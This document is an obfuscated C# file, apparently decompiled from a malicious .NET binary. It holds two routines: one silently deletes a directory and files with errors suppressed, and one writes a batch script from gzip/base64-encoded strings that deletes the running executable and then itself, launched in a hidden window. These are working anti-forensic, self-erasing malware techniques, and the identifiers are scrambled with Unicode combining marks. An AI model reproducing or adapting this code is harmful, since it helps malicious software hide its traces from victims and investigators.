using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;

namespace \u030E\u0360\u0313\u034E\u0315\u0E47\u0020\u0305\u035C\u0351\u0E47\u0351\u0320\u0301\u036B\u0300zcryfxllszuahcty\u0347\u0334\u0342\u0E47\u0310\u032C\u0358\u0340\u036B\u0331\u0329\u036B\u0340\u032F\u0308\u0E47cexuwlosbhsreyjl
{
	// Token: 0x02000069 RID: 105
	internal class Class_81
	{
		// Token: 0x060001EB RID: 491 RVA: 0x000108AC File Offset: 0x0000EAAC
		public static void smethod_240()
		{
			try
			{
				if (Directory.Exists(Class_47.\u035A\u030C\u036Bc\u0326\u0020\u031D\u0331\u035E\u0020\u0020\u030D\u0020\u0368\u034Dtgxjqsczmshvyescj\u0367\u0339\u0309\u0310\u0349\u0309\u035D\u0020\u0020\u0333\u0E47t\u0326\u0355\u033C\u0339qftvsdyuclitenhm))
				{
					Directory.Delete(Class_47.\u035A\u030C\u036Bc\u0326\u0020\u031D\u0331\u035E\u0020\u0020\u030D\u0020\u0368\u034Dtgxjqsczmshvyescj\u0367\u0339\u0309\u0310\u0349\u0309\u035D\u0020\u0020\u0333\u0E47t\u0326\u0355\u033C\u0339qftvsdyuclitenhm + "\\", true);
				}
				if (File.Exists(Class_49.field_9))
				{
					File.Delete(Class_49.field_9);
				}
				if (File.Exists(Class_49.field_10))
				{
					File.Delete(Class_49.field_10);
				}
				Class_82.gmethod_243();
			}
			catch
			{
			}
		}

		// Token: 0x060001EC RID: 492 RVA: 0x0001093C File Offset: 0x0000EB3C
		public static void xmethod_241()
		{
			if (Class_84.\u0313\u034F\u0342\u035C\u032A\u0351\u035C\u0341\u0368\u0331\u0339\u0304\u0363\u032F\u0335\u036Azydqbsqwhowehili\u0332\u0308\u0020\u0E47\u0342\u035C\u0309\u0308\u0020\u0348\u0352t\u0342\u0316\u035F\u0311mvlczskjazmpguzt)
			{
				string text = Path.GetTempFileName() + Class_88.gmethod_253("H4sIAAAAAAAEANNLzk0BAMPCtLEEAAAA");
				using (StreamWriter streamWriter = new StreamWriter(text))
				{
					streamWriter.WriteLine(Class_88.gmethod_253("H4sIAAAAAAAEAFNySE3OyFfIT0sDAP8G798KAAAA"));
					streamWriter.WriteLine(Class_88.gmethod_253("H4sIAAAAAAAEACvJzE3NLy1RMFGwU/AL9QEAGpgiIA8AAAA="));
					streamWriter.WriteLine(Class_88.gmethod_253("H4sIAAAAAAAEAHNx9VEAAJx/wSQEAAAA") + "\"" + Path.GetFileName(new FileInfo(new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath).Name) + "\" /f /q");
					streamWriter.WriteLine(Class_88.gmethod_253("H4sIAAAAAAAEAHN2UQAAQkDmIgMAAAA=") + Path.GetTempPath());
					streamWriter.WriteLine(Class_88.gmethod_253("H4sIAAAAAAAEAHNx9VEAAJx/wSQEAAAA") + "\"" + text + "\" /f /q");
				}
				Process.Start(new ProcessStartInfo
				{
					FileName = text,
					CreateNoWindow = true,
					ErrorDialog = false,
					UseShellExecute = false,
					WindowStyle = ProcessWindowStyle.Hidden
				});
			}
		}
	}
}
